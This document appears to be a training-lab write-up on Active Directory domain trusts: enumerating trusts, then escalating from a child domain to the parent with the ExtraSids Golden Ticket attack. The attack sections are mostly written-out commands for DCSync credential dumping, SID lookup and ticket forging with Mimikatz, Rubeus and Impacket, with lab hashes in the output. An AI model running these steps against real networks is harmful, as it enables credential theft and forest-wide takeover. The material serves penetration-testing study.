# Table of Contents

- [Domain Trusts Primer](#domain-trusts-primer)
  - [Enumerating Trust Relationships](#enumerating-trust-relationships)
- [Attacking Domain Trusts - Child - Parent Trusts - from Windows](#attacking-domain-trusts---child---parent-trusts---from-windows)
  - [SID History Primer](#sid-history-primer)
  - [ExtraSids Attack - Mimikatz](#extrasids-attack---mimikatz)
  - [ExtraSids Attack - Rubeus](#extrasids-attack---rubeus)
- [Attacking Domain Trusts - Child - Parent Trusts - from Linux](#attacking-domain-trusts---child---parent-trusts---from-linux)
  - [Manual method](#manual-method)
  - [Autopwn with raiseChild.py](#autopwn-with-raisechildpy)


# Domain Trusts Primer

## Scenario
Large organizations often acquire companies and establish trust relationships with their domains for quick integration, avoiding full object migration. However, trusts can introduce security weaknesses—a vulnerable subdomain may provide access to the target domain. Trusts may exist with MSPs, customers, or other business units across geographic regions.

## Overview
Trusts enable forest-forest or domain-domain authentication, allowing users to access resources or perform admin tasks outside their primary domain. Communication can be one-way or bidirectional.

**Trust Types:**
* **Parent-child**: Two-way transitive trust within same forest between parent and child domains
* **Cross-link**: Trust between child domains for faster authentication
* **External**: Non-transitive trust between separate domains in different forests; uses SID filtering
* **Tree-root**: Two-way transitive trust between forest root and new tree root domain
* **Forest**: Transitive trust between two forest root domains
* **ESAE**: Bastion forest for Active Directory management

**Trust Properties:**
* **Transitive**: Trust extends to objects the child domain trusts (if Domain A trusts Domain B, and Domain B trusts Domain C, then Domain A trusts Domain C)
* **Non-transitive**: Only the child domain itself is trusted

<img width="984" height="573" alt="image" src="https://github.com/user-attachments/assets/1d444606-5e66-4b7c-980a-9e15c8673d20" />

## Trust Table Side By Side

| Transitive | Non-Transitive |
|------------|----------------|
| Shared, 1 to many | Direct trust |
| Trust shared with anyone in the forest | Not extended to next level child domains |
| Forest, tree-root, parent-child, and cross-link trusts | Typical for external or custom trust setups |

**Analogy**: Transitive trust = anyone in your household can accept packages for you. Non-transitive trust = only you can sign for the package.

## Trust Directions

* **One-way**: Users in trusted domain access resources in trusting domain only
* **Bidirectional**: Users from both domains can access each other's resources

## Security Implications

Domain trusts are often misconfigured and create unintended attack paths. Key risks:

* Trusts established for convenience may lack security review
* M&A activities can introduce bidirectional trusts with companies of unknown security posture
* Attackers may target acquired companies as softer entry points to the main organization
* Common attack: Kerberoasting against external trusted domain yields admin access to principal domain

**Real-world scenario**: Penetration tests frequently succeed by finding flaws in trusted domains that provide foothold or admin rights in the principal domain—an "end-around" attack preventable through security-first trust establishment.

Organizations are often unaware of existing trust relationships, making documentation critical during assessments.

Below is a graphical representation of the various trust types.

<img width="1124" height="764" alt="image" src="https://github.com/user-attachments/assets/63360a73-8576-41f6-bae0-c8cb423ce4d4" />

---

## Enumerating Trust Relationships

We can use the `Get-ADTrust` cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.

### Using Get-ADTrust
```
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

The above output shows that our current domain `INLANEFREIGHT.LOCAL` has two domain trusts.

**1. LOGISTICS.INLANEFREIGHT.LOCAL**
- `IntraForest` property indicates this is a child domain
- We're positioned in the forest root domain

**2. FREIGHTLOGISTICS.LOCAL**
- `ForestTransitive` set to `True` indicates a forest or external trust

Both trusts are **bidirectional**, allowing user authentication in both directions. This is critical for assessment—without cross-trust authentication capability, enumeration and attacks across the trust are impossible.


Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the `Get-DomainTrust` function to enumerate what trusts exist, if any.

### Checking for Existing Trusts using Get-DomainTrust
```
PS C:\htb> Get-DomainTrust 

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
```

PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.

### Using Get-DomainTrustMapping

```
PS C:\htb> Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : FREIGHTLOGISTICS.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:08 PM
WhenChanged     : 2/27/2022 12:02:41 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM
```

From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:

### Checking Users in the Child Domain using Get-DomainUser
```
PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

samaccountname
--------------
htb-student_adm
Administrator
Guest
lab_adm
krbtgt
```

Another tool we can use to get Domain Trust is `netdom`. The `netdom query` sub-command of the `netdom` command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.

### Using netdom to query domain trust

```
C:\htb> netdom query /domain:inlanefreight.local trust
Direction Trusted\Trusting domain                         Trust type
========= =======================                         ==========

<->       LOGISTICS.INLANEFREIGHT.LOCAL
Direct
 Not found

<->       FREIGHTLOGISTICS.LOCAL
Direct
 Not found

The command completed successfully.
```

### Using netdom to query domain controllers

```
C:\htb> netdom query /domain:inlanefreight.local dc
List of domain controllers with accounts in the domain:

ACADEMY-EA-DC01
The command completed successfully.
```

### Using netdom to query workstations and servers

```
C:\htb> netdom query /domain:inlanefreight.local workstation
List of workstations with accounts in the domain:

ACADEMY-EA-MS01
ACADEMY-EA-MX01      ( Workstation or Server )

SQL01      ( Workstation or Server )
ILF-XRG      ( Workstation or Server )
MAINLON      ( Workstation or Server )
CISERVER      ( Workstation or Server )
INDEX-DEV-LON      ( Workstation or Server )
...SNIP...
```

We can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.

**Visualizing Trust Relationships in BloodHound**
<img width="1829" height="568" alt="image" src="https://github.com/user-attachments/assets/15a68f87-2ffc-4392-acc5-37ffaa7783f3" />

---

# Attacking Domain Trusts - Child - Parent Trusts - from Windows

## SID History Primer

### Legitimate Use
The [sidHistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute supports user migration between domains. When migrated, the new account retains the original user's SID in its `sidHistory` attribute, preserving access to resources in the original domain.

### Attack Vector
Though designed for cross-domain scenarios, SID history works within the same domain. Attackers can use Mimikatz to perform **SID history injection**:

1. Add an administrator account's SID to a controlled account's `sidHistory` attribute
2. Upon login, all associated SIDs are added to the user's access token
3. The token determines resource access permissions

### Impact
If a Domain Admin SID is injected into a controlled account's `sidHistory`:
- Perform **DCSync** attacks
- Create **Golden Tickets** or Kerberos TGTs
- Authenticate as any domain account for persistent access

---

## ExtraSids Attack - Mimikatz

### Overview
This attack compromises a parent domain after child domain compromise. Within the same AD forest, `sidHistory` is respected due to lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) (a protection that filters authentication requests across forest trusts).

### Attack Mechanism
By setting a child domain user's `sidHistory` to the **Enterprise Admins group** (exists only in parent domain), the user is treated as a group member, granting administrative access to the entire forest. Essentially, we create a Golden Ticket from the compromised child domain using `SIDHistory` to inject Enterprise Admin rights without actual group membership.

### Requirements
1. KRBTGT hash for child domain
2. Child domain SID
3. Target username in child domain (can be fictitious)
4. Child domain FQDN
5. Enterprise Admins group SID from root domain

### KRBTGT Account Background
The **KRBTGT** account is the Key Distribution Center (KDC) service account in Active Directory:
- Encrypts/signs all Kerberos tickets in the domain
- Domain controllers use its password to decrypt and validate Kerberos tickets
- Can create Kerberos TGT tickets to request TGS tickets for any service/host (Golden Ticket attack)
- Well-known persistence mechanism in AD environments

**Remediation**: Change KRBTGT password periodically and after any penetration test achieving full domain compromise—this is the only way to invalidate Golden Tickets.

Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.

### Obtaining the KRBTGT Account's NT Hash using Mimikatz
```
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

We can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output above.

### Using Get-DomainSID

```
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the `Get-ADGroup` cmdlet with a command such as `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

At this point, we have gathered the following data points:
* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
* The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Before the attack, we can confirm no access to the file system of the DC in the parent domain.

### Using ls to Confirm No Access

```
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.

### Creating a Golden Ticket with Mimikatz

```
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.

### Confirming a Kerberos Ticket is in Memory Using klist

```
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.

### Listing the Entire C: Drive of the Domain Controller

```
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  18,080,178,176 bytes free
```

---

## ExtraSids Attack - Rubeus

We can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.

### Using ls to Confirm No Access Before Running Rubeus

```
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
	
<SNIP>
```

Next, we will formulate our Rubeus command using the data we retrieved above. The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.

### Creating a Golden Ticket using Rubeus

```
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 3/29/2022 10:06:41 AM
[*] StartTime      : 3/29/2022 10:06:41 AM
[*] EndTime        : 3/29/2022 8:06:41 PM
[*] RenewTill      : 4/5/2022 10:06:41 AM

[*] base64(ticket.kirbi):
      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
                              ...<SNIP>...
      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==

[+] Ticket successfully imported!
```

Once again, we can check that the ticket is in memory using the `klist` command.

### Confirming the Ticket is in Memory Using klist

```
PS C:\htb> klist

Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0>	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent 
	Start Time: 3/29/2022 10:06:41 (local)
	End Time:   3/29/2022 20:06:41 (local)
	Renew Time: 4/5/2022 10:06:41 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called:
```

Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.

### Performing a DCSync Attack

```
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
```

---

# Attacking Domain Trusts - Child - Parent Trusts - from Linux

We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:
* The KRBTGT hash for the child domain
* The SID for the child domain
* The name of a target user in the child domain (does not need to exist!)
* The FQDN of the child domain
* The SID of the Enterprise Admins group of the root domain

Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.

## Manual method

### Performing DCSync with secretsdump.py

```
[!bash!]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```

Next, we can use `lookupsid.py` from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. 

In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. 

The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format `DOMAIN_SID-RID`. 

For example, from the output below, we can see that the SID of the `lab_adm` user would be `S-1-5-21-2806153819-209893948-922872689-1001`.

### Performing SID Brute Forcing using lookupsid.py

```
[!bash!]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
513: LOGISTICS\Domain Users (SidTypeGroup)
514: LOGISTICS\Domain Guests (SidTypeGroup)
515: LOGISTICS\Domain Computers (SidTypeGroup)
516: LOGISTICS\Domain Controllers (SidTypeGroup)
517: LOGISTICS\Cert Publishers (SidTypeAlias)
520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
525: LOGISTICS\Protected Users (SidTypeGroup)
526: LOGISTICS\Key Admins (SidTypeGroup)
553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
1001: LOGISTICS\lab_adm (SidTypeUser)
1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
1103: LOGISTICS\DnsAdmins (SidTypeAlias)
1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
1106: LOGISTICS\htb-student_adm (SidTypeUser)
```

We can filter out the noise by piping the command output to grep and looking for just the domain SID.

### Looking for the Domain SID

```
[!bash!]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password:

[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain `SID S-1-5-21-3842939050-3880317879-2865463114` and attach the RID of the Enterprise Admins group. [Here](https://adsecurity.org/?p=1001) is a handy list of well-known SIDs.

### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```
[!bash!]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user `hacker` to forge our Golden Ticket.
* The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
* The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
* The name of a target user in the child domain (does not need to exist!): `hacker`
* The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
* The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Next, we can use `ticketer.py` from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).

### Constructing a Golden Ticket using ticketer.py
```
[!bash!]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

